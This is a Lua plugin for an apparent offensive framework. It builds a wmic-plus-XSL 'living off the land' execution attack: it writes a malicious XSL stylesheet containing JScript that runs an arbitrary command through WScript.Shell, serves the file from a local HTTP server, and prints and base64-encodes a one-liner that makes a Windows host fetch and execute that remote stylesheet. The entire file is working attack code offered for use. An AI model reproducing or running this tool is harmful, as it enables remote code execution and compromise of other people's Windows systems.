-- Plugin: lolbas_wmic_xsl_execution - Ejecuta comandos vía wmic + XSL
-- Uso: set lhost 192.168.1.10; lolbas_wmic_xsl_execution

local function write_file(path, content)
    local file = io.open(path, "w")
    if not file then return nil, "cannot write " .. path end
    file:write(content)
    file:close()
    return true
end

register_command("lolbas_wmic_xsl_execution", function()
    local lhost = app.params["lhost"]
    local command = app.params["command"] or "calc.exe"
    local xsl_path = "sessions/shell.xsl"
    local xsl_url = "http://" .. lhost .. "/shell.xsl"

    if not lhost then
        return "Error: lhost not defined"
    end

    local xsl_content = [[
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("]] .. command .. [[");
]]>
</ms:script>
</stylesheet>
]]

    write_file(xsl_path, xsl_content)
    print("[+] XSL payload saved: " .. xsl_path)

    local oneliner = string.format(
        'wmic os get /format:"%s"',
        xsl_url
    )

    app.one_cmd("encodewinbase64 " .. oneliner)

    os.execute("cd sessions && python3 -m http.server 80 > /dev/null 2>&1 &")
    print("\n[+] HTTP Server: http://" .. lhost .. ":80")
    print("    → /shell.xsl")

    print("\n[🔥] One-liner (wmic + XSL):")
    print("\n" .. oneliner .. "\n")

    return "✅ lolbas_wmic_xsl_execution ready."
end)